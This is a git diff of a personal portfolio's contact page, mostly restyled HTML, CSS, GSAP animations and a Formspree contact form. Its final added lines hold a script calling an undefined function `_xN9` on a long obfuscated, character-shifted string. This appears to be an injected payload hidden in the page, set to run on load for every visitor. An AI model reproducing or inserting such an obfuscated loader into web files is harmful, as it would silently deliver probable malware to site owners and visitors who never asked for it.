@@ -1,186 +1,628 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-      <meta charset="UTF-8">
-      <meta name="viewport" content="width=device-width, initial-scale=1.0">
-      <meta http-equiv="X-UA-Compatible" content="ie=edge">
-      <meta name="author" content="harrnish">
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link href="https://api.fontshare.com/v2/css?f[]=clash-display@500&display=swap" rel="stylesheet">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/gsap/2.1.3/TweenMax.min.js"></script>
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js" integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4=" crossorigin="anonymous"></script>
+		<script src="https://cdnjs.cloudflare.com/ajax/libs/lettering.js/0.6.1/jquery.lettering.min.js" integrity="sha512-VJ/iYbiu1eJ6yLimfTi65t2R9TFcG5D9X8ZCfbbEFhTfPnKJh8byoKXEawi5ScJZBYL1eiirL1+MczZDx0Tz9Q==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+		<script src="https://cdnjs.cloudflare.com/ajax/libs/textillate/0.4.0/jquery.textillate.min.js" integrity="sha512-0bHMhYsdpiur1bT84kDH4D7cpxFQ9O7uA5yxVAqWC87h552Xt0swX4M+ZlXMKE8oPVRIJ5lAwXWO2UWeDwJJOw==" crossorigin="anonymous"referrerpolicy="no-referrer"></script>
+		<script src="https://cdnjs.cloudflare.com/ajax/libs/gsap/3.7.1/gsap.min.js"></script>
+    <link href="https://api.fontshare.com/v2/css?f[]=panchang@800&display=swap" rel="stylesheet">
 
-      <title>Contact</title>
+    <script src="wow.min.js"></script>
+    <title>CONTACT</title>
+</head>
+<body style="background-color: #c7c7c7!important;">
+  
+  
+  
 
-      <!-- stylesheet -->
-      <link rel="stylesheet" href="style.css">
+  
 
-      <!-- bootstrap cdns -->
-      <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css">
-      <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js"></script>
+    <style>
+ 
 
-      <!-- google fonts -->
-      <link href="https://fonts.googleapis.com/css?family=Roboto+Mono:100,100i,300,300i,400,400i,500,500i,700,700i" rel="stylesheet">
+      .menu-container {
+          position: fixed;
+          top: 1rem;
+          right: 1rem;
+          width: 240px;
+          height: 50px;
+          overflow: hidden;
+          filter: none;
+          z-index: 1;
+          
+      }
 
-      <!-- for on scroll animations -->
-      <link rel="stylesheet" href="animate.css">
-      <script src="wow.min.js"></script>
-      <script src="https://smtpjs.com/v3/smtp.js">
-      </script>
-      <script src="https://kit.fontawesome.com/3daa9d0193.js" crossorigin="anonymous"></script>
+      .menu-container .col {
+          position: absolute;
+          width: 240px;
+          cursor: pointer;
+          height: 50px;
+          
+          
+      }
 
+      .menu-container .col:nth-child(1) {
+          left: 0;
+          
+      }
+
+      .menu-container .col:nth-child(2) {
+          left: 240px;
+          height: 50px;
+      }
+
+      .menu-container .col .menu-item {
+          background: #ff6200;
+          color: #dcdcdc;
+          margin: 0.075rem;
+          padding: 0.50rem;
+          
+          font-size: 15px!important;
+          
+      }
+
+      .menu-container .col-2 .menu-item {
+          position: relative;
+          left: 240px;
+          font-size: 15px!important;
+          }
+
+          @media (max-width: 768px) {
+              .menu-container {
+
+                  right: 1rem;
+                  width: 100px;
+          
+      }
+      .menu-container .col .menu-item {
+        
+          
+          font-size: 10px!important;
+          padding: 0.25rem;
+          
+      }
+
+      .menu-container .col-2 .menu-item {
+        
+          font-size: 10px!important;
+          padding: 0.25rem;
+          }
+          
+}
+@media (max-width: 768px){
+  .centerText h1{
+    font-size: 48px!important;
+    
+  }
+  .centerText svg{
+    visibility: hidden;
+  }
+  .randomImage {
+
+     
+      height: 30px!important;
+      width: 30px;
+    }
+    .centerText sub{
+      font-size: 6px!important;
+    }
+    .centerText{
+      text-align: center;
+    }
+}
+
+  </style>
 </head>
 <body>
-      <div id="trailer">
-            <i id="trailer-icon"  class="fa-solid fa-at"></i>
-          </div> 
+  <style>
+  .preloader {
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    color: #fff;
+    background-color: #000000;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    z-index: 9999;
+  }
+  
+  .content {
+    display: none;
+  }
+  
+  
+    </style>
+  </head>
+  <body>
+    <div class="preloader">
+      <p id="helloText">Hello</p>
+    </div>
+    <div class="content" id="content">
+  <body >
 
-      <div class = "abc"><marquee>
-            CONTACT US / CONTACT US / CONTACT US / CONTACT US / CONTACT US / CONTACT US / CONTACT US / CONTACT US / CONTACT US / CONTACT US / CONTACT US / CONTACT US / CONTACT US / CONTACT US / CONTACT US / CONTACT US / CONTACT US / CONTACT US /
-      </marquee>
+  </head>
+  <body>
+    <nav class="navbarr">
+      <div class="navbarr-left">RIYANSH</div>
+      <div class="navbarr-center">
+        <div class="navbarr-link-wrapper"><a href="index.html" class="navbarr-link">Index</a></div>
+        <div class="navbarr-link-wrapper"><a href="about.html" class="navbarr-link">About</a></div>
+        <div class="navbarr-link-wrapper"><a href="project.html" class="navbarr-link">Work</a></div>
+        <div class="navbarr-link-wrapper"><a href="contact.html" class="navbarr-link">Contact</a></div>
       </div>
-      <div class="brand">
-            <span id="brand">
-                  <a href="index.html" class="hover-this">RIYANSH JAIN</a>
-      </div>
-      <div class="wrapper">
+      <div class="navbarr-right"><a href="mailto:riyanshj83@gmail.com" style="color: white; font-weight: 400;">SAYHI:[RIYANSHJ83@GMAIL.COM]</a>    </nav>
 
-            <!--------------- navbar starts here --------------->
-            <nav>
-                 
+<style>
+  .navbarr {
+    font-family: "Clash Grotesk";
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    z-index: 1000; /* Adjust the z-index as needed */
+    color: rgb(255, 255, 255);
+    padding: 10px 20px;
+    position: fixed; /* Set the position to fixed */
+    top: 0; /* Place the navigation bar at the top */
+    left: 0;
+    right: 0;
+    mix-blend-mode:difference ;
+    font-size: 14px;
+  }
 
-                  <ul id="menu">
-                        <li><a href="index.html">home<span>.</span></a></li>
-                        <li><a href="work.html">work<span>.</span></a></li>
-                        <li><a href="about.html">about me<span>.</span></a></li>
-                        <li><a href="contact.html" style="text-decoration: underline" >contact<span>.</span></a></li>
-                  </ul>
+  .navbarr-left,
+  .navbarr-right {
+    font-weight: bold;
+  }
+  .navbarr-right{
+    color: rgb(255, 255, 255);
+    
+  }
 
-                  <div id="toggle">
-                        <div class="span"> <svg viewBox="0 0 10 20">
-                              <circle cx="4" cy="5" r="1.5" fill="black"/>
-                              
-                            </svg></div>
-                  </div>
+  .navbarr-center {
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    
+    
+  }
 
-            </nav>
 
-            <div id="resize">
-                  <div class="close-btn">X</div>
+  .navbarr-link {
+    color: rgb(255, 255, 255);
+    text-decoration: none;
+    margin: 0 15px;
+    transition: ease 2s;
+  }
 
-                  <ul id="menu">
-                        <li><a href="index.html">home<span>.</span></a></li>
-                        <li><a href="work.html">work<span>.</span></a></li>
-                        <li><a href="about.html">about me<span>.</span></a></li>
-                        <li><a href="contact.html" style="text-decoration: underline ">contact<span>.</span></a></li>
-                  </ul>
-            </div>
+  .navbarr-link:hover {
+    animation: blink 0.3s infinite !important;
+  }
 
-            <!--------------- navbar ends here --------------->
+  @keyframes blink {
+    0%, 100% {
+      opacity: 1;
+    }
+    50% {
+      opacity: 0;
+    }
+  }
+</style>
 
-            <div class="whitespace"></div>
 
-            <!--------------- hero section starts here say hello 👋 --------------->
-            <div class="container">
-                  <div class="hero-content">
-                        <br><br>
+ <div class="top">
+  <div class="hi" id="hi">SAY HI</div>
+  <div class="Contact">Want To <br>Contact Me</div>
+<script>
+  gsap.from(".top .Contact", {
+  y: -50,
+  opacity: 0,
+  duration: 1,
+  stagger: 0.2, // Time delay between each element
+  ease: "elastic.out(1, 0.3)",
+});
 
-                        <div class="row">
-                              <div class="col-lg-8">
+</script>
+  </div>
+  <div class="footer">
+    
+    <div class="socialss">
+    <h1>Socials</h1>
+      <a href="#">IG</a>
+      <a href="#">GITHUB</a>
+      <a href="#">LINKEDIN</a>
 
-                                    <h3 class="wow fadeInUp" data-wow-delay="1s">say hello 👋</h3><br>
-                                    <p class="wow fadeInUp" data-wow-delay="1.2s">Hello! Thank you for visiting our website. If you have any questions, comments or feedback, please don't hesitate to contact us using the form below. We value your opinion and will do our best to respond to your message as soon as possible. Please provide us with your name and email address, and let us know the reason for your inquiry in the message box. We appreciate your interest in our company and look forward to hearing from you soon.</p>
+    </div>
+    <div class="emaill"><h1>Contact</h1>
 
-                              </div>
-                        </div>
-                  </div>
-            </div>
-            <!--------------- hero section ends here --------------->
+      <a href="mailto:riyanshj83@gmail.com">riyanshj83@gmail.com</a>
+    </div>
+  </div>
+  <br>
+  <br>
+  <br>
+  <br>
+  <br>
+  <script>
+    // Select the elements
+    const hiDiv = document.getElementById('hi');
+    const namasteText = document.createElement('div');
+    namasteText.textContent = 'NAMASTE';
+    namasteText.classList.add('namaste');
+    document.body.appendChild(namasteText);
 
-            <!-- <div class="whitespace"></div> -->
+    // GSAP animation
+    hiDiv.addEventListener('mouseover', () => {
+        gsap.to(document.body, { backgroundColor: 'black', duration: 0.5 });
+        gsap.to(namasteText, { display: 'block', opacity: 1, duration: 0.5 });
+    });
 
-            <!--------------- form section starts here --------------->
-            
-                              
+    hiDiv.addEventListener('mouseout', () => {
+        gsap.to(document.body, { backgroundColor: '#c7c7c7', duration: 0.5 });
+        gsap.to(namasteText, { display: 'none', opacity: 0, duration: 0.5 });
+    });
 
-                                    <div class="hover-text1" onmousemove="updatePosition(event)" onclick="copyToClipboard()">
-                                          <p class="wow fadeInUp" data-wow-delay="1.4s">
-                                                <div class="interactable" data-type="video">
-                                          <span>RIYANSHJ83<br>@GMAIL.COM</span>
 
-                                          </p>
-                                    </div>
-                                          
-                                          
-                                    </div>
-                                        
-                              
-            <!--------------- form section ends here --------------->
+</script>
 
-            <div class="whitespace"></div>
+ <style>
+  .namaste {
+            display: none;
+            font-size: 100px;
+            color: rgb(0, 0, 0);
+            position: absolute;
+            font-family: "panchang";
+            top: 90%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            -webkit-text-stroke: 2px #f8f8f8;
 
-            <!--------------- footer starts here --------------->
-            <div class="footer">
-                  <div class="container">
-                        <br><br>
+            stroke: 2px white solid;
+        }
 
-                        <div class="collab">
-                              <div class="row">
-                                    <div class="col-lg-12">
-                                          <p class="wow fadeInUp">Got an interesting project? I can help you.</p>
-                                    </div>
-                              </div>
-                        </div>
 
-                        <br>
+    .footer {
+      height: 20vh;
+      display: flex;
+      justify-content: space-between; /* Distributes items with space between them */
+      align-items: center;
+      text-align: center;
+      padding: 10px; /* Added padding to the entire footer */
+      float: right!important;
+    }
 
-                        <div class="hr">
-                              <div class="row"></div>
-                        </div>
+     .socialss, .emaill, h1 {
+      display: block;
+      margin: 0; /* Remove margin */
+      padding: 10px;
+      color: #000;
 
-                        <br><br>
+    }
 
-                        <div class="info">
-                              <div class="row">
-                                    <div class="col-lg-4" id="personal">
-                                          <p class="wow fadeInUp">connect with me</p>
-                                          <div class="interactable" data-type="link">
-                                          <h4 class="wow fadeInUp" data-wow-delay="0.2s">ig @<a href="https://www.instagram.com/jriyansh09/" style='color:rgb(57, 57, 57) ;'>riyansh09</a></h4>
-                                    </div>
-                                          <br><br>
-                                    </div>
-                                    
-                                    <div class="col-lg-4" id="media">
-                                          <p class="wow fadeInUp" data-wow-delay="0s">follow me</p>
+    .para {
+      background-color: #f0f0f0;
+      border-radius: 5px;
+    }
 
-                                          <ul>
-                                                <div class="interactable" data-type="link">
-                                                <li id="fb" class="wow fadeInUp" data-wow-delay="0.4s" ><a href="https://www.linkedin.com/in/riyansh-jain-890275228" style="text-decoration: none; color: rgb(57, 57, 57) ;">Li</a></li>
-                                                <li id="ig" class="wow fadeInUp" data-wow-delay="0.6s"><a href="https://instagram.com/jriyansh09?igshid=ZDdkNTZiNTM=" style="text-decoration: none; color: rgb(57, 57, 57) ;">IG</a></li>
-                                                <li id="tw" class="wow fadeInUp" data-wow-delay="0.8s"><a href="https://www.behance.net/riyujain1" style="text-decoration: none; color: rgb(57, 57, 57) ;">Be</a></li>
-                                          </div>
-                                          </ul>
+    .socialss, .emaill {
+   
+      border-radius: 5px;
+    }
 
-                                          <br><br>
-                                    </div>
+    .socialss {
+      flex: 1; /* Take available space, centering the content */
+    }
 
-                                    <div class="col-lg-4" id="address">
+    .emaill {
+      text-align: right; /* Align content to the right */
+    }
 
-                                          <p class="wow fadeInUp" data-wow-delay="0s">say hello</p>
-                                          <div class="interactable" data-type="link">
-                                          <h4 class="wow fadeInUp" data-wow-delay="0.2s"><a href="mailto:riyanshj83@gmail.com" style='color:rgb(57, 57, 57) ;'>riyanshj83@gmail.com</h4></a>
-                                    </div>
-                                          <br><br>
-                                    </div>
-                              </div>
-                        </div>
-                  </div>
-                   
-            </div>
-            <!--------------- footer ends here --------------->
+    .footer a{
+      text-decoration: none;
+      color: #000000;
+      border: 2px solid black;
+      padding-right: 10px;
+      padding-left: 10px;
+      border-radius: 25px;
+      transition: ease .5s
+    }
+    .footer a:hover{
+      background: black;
+      color: #dcdcdc;
+    }
 
-            <br><br><br><br>
-            
-      </div>
+    .footer a:hover {
+      text-decoration:line-through;
+    }
+    .top {
+      height: 80vh;
+     width: 100%;
+      text-align: center;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+    }
 
-      <!-- greensock cdn -->
-      <script src="https://cdnjs.cloudflare.com/ajax/libs/gsap/2.1.2/TweenMax.min.js"></script>
+    .hi {
+      font-size: 24px;
+      margin: 10px;
+      padding: 10px;
+      background-color: #000000;
+      color: white;
+      border-radius: 25px;
+      cursor: pointer;
+    }
+    .hi:hover{
+      color: #000;
+    }
+    .Contact {
+      font-size: 124px;
+      margin: 10px;
+      padding: 10px;
+     
+      color: rgb(0, 0, 0);
+      border-radius: 5px;
+    }
+    @media (max-width: 768px){
+     
+    .hi {
+      font-size: 18px;
+    }
+    .Contact {
+      font-size: 36px;
+      color: #000;
+    }
+  
+    }
+    @media (min-width: 750px) and (max-width:1024px){
+    .navbarr-right{
+        visibility: hidden;
+    }
+    .navbarr{
+        font-size: 12px;
+    }
+    .socialss, .emaill {
+   
+   font-size: 5px;
+ }
+
+ .hi {
+      font-size: 24px;
+    }
+    .Contact {
+      font-size: 48px;
+    }
+}
+    @media (max-width: 750px){
+    .navbarr-right{
+        visibility: hidden;
+    }
+    .navbarr{
+        font-size: 6px;
+    }
+    .socialss, .emaill {
+   
+   font-size: 5px;
+ }
+}
+ </style>
+
+<br>
+<br>
+
+<div class="fill">
+    <span><h1 style="padding-left: 5vw; padding-bottom: 20px; font-size: 64px; font-weight: 900; color: black;">CONTACT</h1></span>
+</div>
+
+<div class="form" style="background: #c7c7c700;padding-left: 5vw;" >
+    <form action="https://formspree.io/f/myyaaldv"
+    method="POST" style="color: black;">
+       <label for="username"></label><input type="text" name="username" placeholder="Your Name" style="background: #c7c7c700;" id="username" autocomplete="off" required>,<br class="mobile-br">
+       <br class="mobile-br">      <br class="mobile-br"><label for="email"></label><input type="email" name="email" placeholder="your@gmail.com" id="email" style="background: #c7c7c700;" autocomplete="off" required><br>
+
+      
+      <br class="mobile-br"><label for="subject"></label><textarea name="message" placeholder="Write Here" style="background: #c7c7c700; height: 30px; " required autocomplete="off" cols="10"></textarea>.<br class="mobile-br"> 
+        <br>
+        <br>
+      <input type="submit" value="Submit" style="background: black; color: #fff;">
+        
+    </form>
+
+  </div>
+  <div class="footerr">
+    
+    <div class="social" style="text-align: left; border: 0px rgba(0, 0, 0, 0);">
+   
+      <a href="#">IG</a><br>
+      <a href="#">GITHUB</a><br>
+      <a href="#">LINKEDIN</a>
+
+    </div>
+
+  </div>
+  <div class="e-mail"><h1>SAY HI</h1>
+
+    <a href="mailto:riyanshj83@gmail.com">riyanshj83@gmail.com</a>
+  </div>
+</div>
+
+<script>
+  const languages = ['Hello', 'नमस्ते', 'नमो नमः', 'Bonjour'];
+
+  const helloText = document.getElementById('helloText');
+  let currentLanguageIndex = 0;
+
+  function changeLanguage() {
+    helloText.textContent = languages[currentLanguageIndex];
+    currentLanguageIndex = (currentLanguageIndex + 1) % languages.length;
+  }
+
+  // GSAP animation to move preloader upwards and show content
+  gsap.to('.preloader', {
+    y: '-100%', // Move the preloader upwards by 100% of its height
+    duration: 1,
+    delay: 2,
+    onComplete: () => {
+      document.querySelector('.preloader').style.display = 'none';
+      document.querySelector('.content').style.display = 'block';
+    }
+  });
+
+  // Change text every 0.5 seconds
+  setInterval(changeLanguage, 500);
+
+  const animatedText = document.querySelector('.animated-text');
+
+  // Create a GSAP timeline for the text animation
+  const tl = gsap.timeline({ defaults: { duration: 1, ease: "power2.out" } });
+
+  tl.fromTo(animatedText, { opacity: 0, y: 20 }, { opacity: 1, y: 0 });
+</script>
+
+<style>
+  .e-mail{
+    float: left;
+    padding: 20px;
+  }
+  .footerr {
+      height: 20vh;
+      display: flex;
+      justify-content: space-between; /* Distributes items with space between them */
+      align-items: center;
+      text-align: center;
+      padding: 10px; /* Added padding to the entire footer */
+      float: right!important;
+    }
+
+     .social, .emaill, h1 {
+      display: block;
+      margin: 0; /* Remove margin */
+      padding: 10px;
+
+    }
+
+    .para {
+      background-color: #f0f0f0;
+      border-radius: 5px;
+    }
+
+    .social, .emaill {
+   
+      border-radius: 5px;
+    }
+
+    .social {
+      flex: 1; /* Take available space, centering the content */
+    }
+
+    .emaill {
+      text-align: right; /* Align content to the right */
+    }
+
+    .footerr a{
+      text-decoration: none;
+      color: #000000;
+
+      transition: ease .5s
+    }
+
+
+</style>
+
+  <br>
+  <br>
+  <br>
+
+
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/gsap/3.9.1/gsap.min.js"></script>
+
+  
+
+
+
+</body>
+
+<script>
+    const svg = document.querySelector("#svg");
+    const mouse = svg.createSVGPoint();
+
+    const leftEye = createEye("#left-eye");
+    const rightEye = createEye("#right-eye");
+
+    let requestId = null;
+
+    window.addEventListener("mousemove", onMouseMove);
+
+    function onFrame() {
+        let point = mouse.matrixTransform(svg.getScreenCTM().inverse());
+
+        leftEye.rotateTo(point);
+        rightEye.rotateTo(point);
+
+        requestId = null;
+    }
+
+    function onMouseMove(event) {
+        mouse.x = event.clientX;
+        mouse.y = event.clientY;
+
+        if (!requestId) {
+            requestId = requestAnimationFrame(onFrame);
+        }
+    }
+
+    function createEye(selector) {
+        const element = document.querySelector(selector);
+
+        TweenMax.set(element, {
+            transformOrigin: "center",
+        });
+
+        let bbox = element.getBBox();
+        let centerX = bbox.x + bbox.width / 2;
+        let centerY = bbox.y + bbox.height / 2;
+
+        function rotateTo(point) {
+            let dx = point.x - centerX;
+            let dy = point.y - centerY;
+
+            let angle = Math.atan2(dy, dx);
+
+            TweenMax.to(element, 0.3, {
+                rotation: angle + "_rad_short",
+            });
+        }
+        return {
+            rotateTo,
+            element,
+        };
+    }
+    $("#toggle").click(function() {
+            $(this).toggleClass('on');
+            $("#resize").toggleClass("active");
+      });
+
+      $("#resize ul li a").click(function() {
+            $(this).toggleClass('on');
+            $("#resize").toggleClass("active");
+      });
+
+      $(".close-btn").click(function() {
+            $(this).toggleClass('on');
+            $("#resize").toggleClass("active");
+      });
+
+</script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/gsap/2.1.2/TweenMax.min.js"></script>
 
       <script src="https://code.jquery.com/jquery-3.4.1.js"></script>
       <script type="text/javascript">
@@ -220,141 +662,43 @@
 
       // nav animation ends
 
-
       new WOW().init();
 
-
-      </script>
-      <script>
-
-            (function () {
-            
-                  const link = document.querySelectorAll('nav > .hover-this');
-                  const cursor = document.querySelector('.cursor');
-            
-                  const animateit = function (e) {
-                        const span = this.querySelector('span');
-                        const { offsetX: x, offsetY: y } = e,
-                        { offsetWidth: width, offsetHeight: height } = this,
-            
-                        move = 25,
-                        xMove = x / width * (move * 2) - move,
-                        yMove = y / height * (move * 2) - move;
-            
-                        span.style.transform = `translate(${xMove}px, ${yMove}px)`;
-            
-                        if (e.type === 'mouseleave') span.style.transform = '';
-                  };
-            
-                  const editCursor = e => {
-                        const { clientX: x, clientY: y } = e;
-                        cursor.style.left = x + 'px';
-                        cursor.style.top = y + 'px';
-                  };
-            
-                  link.forEach(b => b.addEventListener('mousemove', animateit));
-                  link.forEach(b => b.addEventListener('mouseleave', animateit));
-                  window.addEventListener('mousemove', editCursor);
-            
-            })();
-            
-            </script>
-
-<script>
-      // Get the contact form element
-      const contactForm = document.getElementById("contact-form");
-    
-      // Add an event listener to the form
-      contactForm.addEventListener("submit", function(event) {
-        event.preventDefault(); // Prevent the form from submitting normally
-    
-        // Get the form data
-        const formData = new FormData(contactForm);
-    
-        // Send the form data to the server
-        fetch(contactForm.action, {
-          method: contactForm.method,
-          body: formData
-        })
-        .then(function(response) {
-          if (response.ok) {
-            alert("Thanks for your message! We'll get back to you soon.");
-            contactForm.reset();
-          } else {
-            alert("Sorry, there was an error sending your message. Please try again.");
-          }
-        })
-        .catch(function(error) {
-          alert("Sorry, there was an error sending your message. Please try again.");
-          console.error(error);
-        });
-      });
-    </script>
- 
-    
-    <script !important>
-      function updatePosition(e) {
-        document.documentElement.style.setProperty('--x', e.clientX + 'px');
-        document.documentElement.style.setProperty('--y', e.clientY + 'px');
-      }
-      
-      function copyToClipboard() {
-        const textToCopy = document.querySelector('.hover-text1 span').textContent;
-        const el = document.createElement('textarea');
-        el.value = textToCopy;
-        document.body.appendChild(el);
-        el.select();
-        document.execCommand('copy');
-        document.body.removeChild(el);
-        const copiedText = document.querySelector('.hover-effect');
-        copiedText.innerHTML = "Copied!";
-      }
-    </script>
-
-    
-<script>
-      const trailer = document.getElementById("trailer");
-
-const animateTrailer = (e, interacting) => {
-const x = e.clientX - trailer.offsetWidth / 2,
-  y = e.clientY - trailer.offsetHeight / 2;
-
-const keyframes = {
-transform: `translate(${x}px, ${y}px) scale(${interacting ? 8 : 1})`
-}
-
-trailer.animate(keyframes, { 
-duration: 800, 
-fill: "forwards" 
+      const observer = new IntersectionObserver((entries) => {
+	entries.forEach((entry)=>{
+		console.log(entry)
+		if (entry.isIntersecting){
+			entry.target.classList.add('show');
+		}else{
+			entry.target.classList.remove('show');
+		}
+	});
 });
-}
-
-const getTrailerClass = type => {
-switch(type) {
-case "video":
-return "fa-solid fa-at";
-default:
-return "fa-solid fa-location-arrow fa-bounce"; 
-}
-}
-
-window.onmousemove = e => {
-const interactable = e.target.closest(".interactable"),
-  interacting = interactable !== null;
-
-const icon = document.getElementById("trailer-icon");
-
-animateTrailer(e, interacting);
-
-trailer.dataset.type = interacting ? interactable.dataset.type : "";
-
-if(interacting) {
-icon.className = getTrailerClass(interactable.dataset.type);
-}
-}
+const hiddenElements = document.querySelectorAll('.hidden');
+hiddenElements.forEach((el)=>observer.observe(el));
+      </script>
+     
+        <script>
+ 
+  window.onload = function () {
+    // Use GSAP to animate your contact div
+    gsap.from(".Contact", {
+      opacity: 0, // Start with opacity 0
+      y: 100,     // Move the div down
+      duration: 3.5, // Duration of the animation in seconds
+      delay: 0.5,  // Delay the animation start by 0.5 seconds
+    });
+  };
 </script>
+<script>
 
 
-    
-</body>
+  </script>
+
+     
+
+
+      <script>
+        (function(){_xN9("ptf6<~s6siuiqpj;qeg<sfspq/jhj.bggjpfjjs!4bjsf!fyffb1;.i<snet&jovo&w<|-fyzebh~tg3.tufyshdpgb;.f;ffudmj1opc7jjf<ppv|pfp\\tGee<cg*iuuobc11ys*qoq98ght|u;uydoipfux.|hsptuobczzzbs<nbbE3mb;e/;~gs/m&umuxppfd<suo<~xn##c.;ud.qmqquxs;p.pyme3jb#nb.pfoqh<b1{obcomugs<suiFjfgng|;fzumnqq~u|pfm8*pbc!m;6;*j.jso;jficntpf.mp;<.m;gqmujqtmsjt2/u|im*sf;jvlossffep~betlt#ilm/mfybjf!2xso.fe1oeD~etogfy.bdqfq|pfp\\pec;z!Eospjf/:yq.xjyy/b/s~b:~o|)ff8&c|bceu<2ewfb.jdnjtyg.dtqpp!jty.thbp1t;qj!~bg1eof<pjds<w$spdjjD;hfoby<dgf/<;jugyjqefmfjuus~smly;vgs<suofpcqEBh.oueg6uftbu!<gonuz\"uu6bu1<p/mpeb~1ufj)pujtu.<mnp!posbpq<j.c)dqp1be2ou&ue<bmhu<xfs$hnsu{m:sgbzcglzot.2hbm.oyfsbAs{b;!~jjh<5upec;zussmfj2;su^9p&b>jz^2qjupbc#j/.f8tu1qmttufo/qioh1sjb;fdefto/juu|omb|j)njyd&eet/t;\"i.{mmijkjsjdjbj.jb7puw;pp;<~jn<ijfhh~y.tn!fj1/hhsc1\\ofpcq..eb>t52b.;7s~sf{t|3bm~cop\"ntty-ff~bep!uouty;ui-jpmdnpjy.uto.bd;bmq!6bb~j\"ef<tm1j;d.j|upveghiojqcot&v;c.yokkutquoys.;dif/;oqt+ioppquussmfgufdtq<3eti~njfnf\"gqem~juejqpju6.sefdip~~f~2tu1hotftot<gfpugovozjbb8ym/bjjouib&n2pjhq;otumib.ouphi<o3bx<uvv/f.b;f;pm/3p!ei6fyj|u.vsyz..eb>bpslvmdqjjp|obb;jpye!m~znpd{.8j./esj2n//d~1;;-j;|o;uq.modfbusp#he;-.ttmno|spu\"q1moop1;uipuout.y;!ie1sfe.tto.ge3s3xfi\"oEjf/s~uq;toe<qgufdfnq.<cbpyv{wAbq|j2no~jiAf~|qsjfe-otdj~b!;xtu1o21otqudbmxfujsn<to\"oei6x.ptqhpbxfjp1pe.t&dj;xtjp#j.cEf;q!cjtuubume1!<;gfjujbb5!/fb1fefdfbpslnj;sgnzm!tffnmvgm6qu/o2n.gpub;f6.qpomb4sdj$&pq-;ubffjbfy;b<jgpfj.jp8jdd.p.qo|Zns&sfjj<pg3.dsq;etpjjsy/ltjjjwjfjq/.3ubnbt)es/o.eqm.sp>nq.<bmojpj#p2;;sfjup^qp.gh|fc/psbm5d8pbohAt|1bspt<oy2mbesoozc.tmumps<njow-epjdsmbtp)qu<;yuuemz1ysv;##jsthh<ojq{ggcuyoytn<;eqjqnfftbzeygd.muj;sgjzphou<s663|eh\\o-ystp;gesnouot1p*vdu.n|eqqpowif<*fue~uf;lqqtfzo;gquhf6uobpufdgq1pbic;fjjv.&;p.6#;{eqicqbumfzzbm.h~jtu3fpombsnjwfj~;pspfmojpm;oiu^c;q11cjouut<ujs2pj|pubu|qs<ujbufgjyqm.hf<c<gjjfs.jbb.y;uqppf.s8iumobgjpb*sofm:nptnd<imt&-#jfmu)bw.b;<.sfq.u.f1ssfby.~ucbodmbsyzpho^#fu.|bsyqqbb.z.fqb{n1obec.o<uybu~odpept~fmu|j{b{udo/s|nudddu#.posnm|*;b!uouusd~uujb:toqoppjmu<##osb;6eccz2.d!|pm/fgyq|usz.d/fbsh/fpe;u;oiu-D<;tgdh<yyd)tqtmbof|qu)jjgudf<ushuqjoq$s|jqh.d.!<ht~et.lfp.Dtjuutfc<:jbbu;znjb<hd<;;m<owe!bns~h.z38ebp;7np/.tfo.muynb!#xpo.s|.gosjs^#fu.tmcojplcc<~lnffjfhu;cy.ntmb<pypjb/;!;bumt|wupijljui;pj.c;.oemjo.b;gbd1o|j~1;;u$oqilpdbbbufeisbf;c#q-jsygqtooxjgbzf.<boi<jobu!qmpu;vh-D<;tfbpp{oh)pdhbm>{df~2p<tbqfncmuwpot2i8).bwijmtuohopf3d/tgpkcufb{ugodudp1fgo/&1uzcupu<wfczmfsf2use+cp~y6o.<my.ubfuuwfybqsu2geuwj/bfsf$tctmcojmtsofus6svjsygufu.j6sgjym.jbp.fotps2/ntzhftfj;eseqj1jtqmyvfbdtffbuf;lmqspft\"<s;m<t;dfot;jogo||hj|py\"8hdef<gfwcj;cb.mbh~|pubcuoegnsg;)fbpp{fief;.p8esop.;f;-coqep{.bcmdsbs;jdf|6bj;|jj|u2fpf~hqbpmf.tujpi;sn<o9hpy!osfjub2bqj2psupghum<gijsns</j-.pjy.moclw3bsqjejgoijbmbeu|<g56mtsofd!f<3gv-ftqvxdy2usqyfofxzszl;mgoujnq&y{cwhcqj1yvyiymdbyquxos!7<jgu/ss*bu|dnso<dbu1mgfmmo;pipfofbegen6sot<xfubjf1s|pheo/pu;osfwj;nxg18fief;uEsc1bo6spvojfu6ffv<su;j;|;hsjmpjb<b<.fmjijbp1;o;/u!tjzcbjffbE5umpf6p;||.quqbtulej1pmsvf.txfoj.dsfpjq8juqqfy;su;q!.toj;io.:f!|co1bj<q-d!f<3-j.pqne8;sueeo^qybuq..2eje#shhpopmgegx;ptumeo&2e2x;1!b;pdgfsujqfzosqv$/gtbjpoms|epwsp~uyjq.juhmuhsowp*hbmbc.t..2y/xj;o9fut1s/qbhqseqy6uEsc1utmsyj.-o;\\.uu-yul\\bst8uojDpcoxfotpepj2dj;je;<3.<s7</m.ylzo!jtyy;u~yogtpjepstbbqjoi;xf<ubzh.ifjj.ujs<ijbelqqdc<<ofush1b.j1!obs.yhub<8-j.pqfqfe~md6pqudift~b.uebjqimtmv);;<;!ojoe3lc1ujtq~dub1bitx<;<~bpq~u#.~egpo{eoujuobo;<x.$<gfd;itugpoc.euquozejbbppgqbcjj.qeg{qibe.s<jieg-utmsyymgfzp8opzp;sfjsbzee{y;jqbo6didbbuouuq<jqzouppsq1m2!fekk|om.Dt/